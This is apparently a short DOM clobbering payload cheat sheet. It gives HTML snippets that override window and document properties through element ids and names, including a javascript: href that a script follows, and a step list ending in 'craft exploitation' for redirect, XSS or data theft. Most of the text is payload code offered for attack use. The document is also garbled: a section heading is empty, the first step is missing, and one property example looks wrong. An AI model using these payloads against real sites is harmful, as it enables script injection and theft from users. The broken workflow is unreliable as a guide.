# DOM Clobbering Payloads

## ========================================
## BASIC DOM CLOBBERING
## ========================================

# Override window properties
<img id="x" src="x">
<script>alert(x)</script>  // x is now the img element

# Named form elements
<form id="myForm">
  <input name="action" value="malicious">
</form>
<script>
  // myForm.action is now "malicious"
</script>

## ========================================
## COMMON CLOBBERING TARGETS
## ========================================

# Window object
<img id="test">
// window.test now references the img element

# Document properties
<form name="forms"></form>
// document.forms.forms now references the form

# Attributes
<a id="x" href="javascript:alert(1)">
<script>
  if (x.href) location = x.href;
</script>

## ========================================

grep -r "document\." app.js

# 2. Find clobberable properties
Look for global variable access

# 3. Inject clobbering payload

# 4. Verify override
Check if property is clobbered

# 5. Craft exploitation
Redirect, XSS, or data theft
